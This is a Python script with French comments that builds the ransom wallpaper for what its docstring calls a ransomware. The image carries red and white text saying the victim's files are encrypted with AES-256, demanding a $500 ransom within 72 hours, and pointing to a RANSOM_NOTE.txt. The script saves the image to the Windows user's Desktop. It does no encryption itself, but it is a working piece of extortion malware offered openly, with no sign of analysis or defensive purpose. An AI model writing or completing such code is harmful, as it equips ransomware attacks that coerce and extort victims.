from PIL import Image, ImageDraw, ImageFont
import os

def create_ransom_background(output_path, width=1920, height=1080):
    """
    Crée une image de fond d'écran pour le ransomware
    """
    # Créer une image noire
    img = Image.new('RGB', (width, height), color='black')
    draw = ImageDraw.Draw(img)
    
    # Essayer de charger une police
    try:
        # Essayer différentes polices selon la plateforme
        font_paths = [
            "C:\\Windows\\Fonts\\Arial.ttf",  # Windows
            "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",  # Linux
            "/System/Library/Fonts/Helvetica.ttc"  # macOS
        ]
        
        font = None
        for path in font_paths:
            if os.path.exists(path):
                font = ImageFont.truetype(path, 60)
                break
                
        if font is None:
            font = ImageFont.load_default()
            
    except Exception:
        font = ImageFont.load_default()
    
    # Ajouter le texte principal
    title = "VOS FICHIERS ONT ÉTÉ CHIFFRÉS"
    if font:
        text_width = draw.textlength(title, font=font)
    else:
        text_width = width // 2
    
    # Dessiner le titre en rouge
    draw.text(
        ((width - text_width) // 2, height // 4),
        title,
        font=font,
        fill=(255, 0, 0)
    )
    
    # Ajouter les instructions
    instructions = [
        "Tous vos documents, photos, vidéos et autres fichiers importants",
        "ont été chiffrés avec un algorithme militaire AES-256.",
        "",
        "Pour récupérer vos fichiers, vous devez payer une rançon de 500$.",
        "",
        "Lisez le fichier RANSOM_NOTE.txt sur votre bureau pour plus d'informations.",
        "",
        "VOUS AVEZ 72 HEURES POUR PAYER OU VOS FICHIERS SERONT PERDUS À JAMAIS."
    ]
    
    # Essayer de charger une police plus petite pour les instructions
    try:
        small_font = None
        for path in font_paths:
            if os.path.exists(path):
                small_font = ImageFont.truetype(path, 30)
                break
                
        if small_font is None:
            small_font = ImageFont.load_default()
    except Exception:
        small_font = ImageFont.load_default()
    
    # Dessiner les instructions
    y_offset = height // 2
    for line in instructions:
        if small_font:
            text_width = draw.textlength(line, font=small_font)
        else:
            text_width = width // 2
        
        # Dessiner le texte en blanc
        draw.text(
            ((width - text_width) // 2, y_offset),
            line,
            font=small_font,
            fill=(255, 255, 255)
        )
        y_offset += 40
    
    # Sauvegarder l'image
    img.save(output_path)
    print(f"Image de fond d'écran de rançon créée: {output_path}")

if __name__ == "__main__":
    # Obtenir le chemin du bureau
    desktop_path = os.path.join(os.environ.get('SystemDrive', 'C:'), os.sep, 
                              'Users', os.environ.get('USERNAME', ''), 'Desktop')
    output_path = os.path.join(desktop_path, "ransom_bg.png")
    
    create_ransom_background(output_path) 